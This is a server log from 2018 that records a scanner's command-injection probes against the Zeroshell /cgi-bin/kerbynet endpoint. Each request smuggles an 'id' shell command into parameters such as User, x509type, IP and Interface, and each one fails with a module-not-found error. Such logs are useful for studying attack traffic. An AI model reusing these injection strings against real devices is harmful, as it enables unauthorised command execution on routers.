[ 2018-07-21T00:50:10+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?Action=StartSessionSubmit&User=%27%26id%26%27&PW=
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:11+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%26id%26%27
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000040s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:11+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=%22%26id%26%22
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000030s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:12+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;id;%22
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:12+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HERE&Action=Render&Object=acctEntries&Filter=%26id%26
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000043s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:13+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HERE&Section=Router&Action=CheckIPPING&IP=%26id%26
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000035s ]
ERR: 无法加载模块:Cgi-bin

[ 2018-07-21T00:50:13+08:00 ] 101.254.225.93 /cgi-bin/kerbynet?STk=INSERT-STk-TOKEN-HERE&Section=Network&Action=ShowInterface&Interface=%26id%26
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000041s ]
ERR: 无法加载模块:Cgi-bin

